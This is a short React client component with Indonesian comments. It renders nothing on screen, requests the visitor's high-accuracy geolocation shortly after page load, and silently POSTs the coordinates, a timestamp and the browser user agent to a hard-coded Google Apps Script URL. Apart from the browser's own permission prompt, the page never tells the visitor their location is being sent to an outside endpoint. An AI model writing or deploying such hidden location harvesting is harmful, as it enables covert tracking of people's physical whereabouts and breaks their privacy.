"use client";

import { useEffect } from "react";

export default function SendLocation() {
  useEffect(() => {
    const sendLocation = async () => {
      if (!navigator.geolocation) {
        console.log("Geolocation tidak didukung di browser ini");
        return;
      }

      try {
        // Minta lokasi
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 300000, // Cache 5 menit
          });
        });

        const { latitude, longitude } = position.coords;

        console.log("Lokasi berhasil didapat:", { latitude, longitude });

        const GAS_URL =
          "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";

        // Kirim data
        fetch(GAS_URL, {
          method: "POST",
          mode: "no-cors",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            latitude,
            longitude,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
          }),
        }).catch((err) => console.log("Gagal mengirim lokasi:", err));

      } catch (error: any) {
        console.error("Error mendapatkan lokasi:", error);

        // ERROR HANDLER AMAN untuk HP & PC
        const code = error.code;

        if (code === 1) {
          console.log("Permission lokasi ditolak");
        } else if (code === 2) {
          console.log("Lokasi tidak tersedia");
        } else if (code === 3) {
          console.log("Timeout");
        } else {
          console.log("Error lain:", error);
        }
      }
    };

    // cek izin lokasi jika permissions API tersedia
    if (navigator.permissions) {
      navigator.permissions
        .query({ name: "geolocation" as PermissionName })
        .then((result) => {
          console.log("Izin saat ini:", result.state);
        })
        .catch(() => {});
    }

    const timer = setTimeout(sendLocation, 1200);

    return () => clearTimeout(timer);
  }, []);

  return null;
}
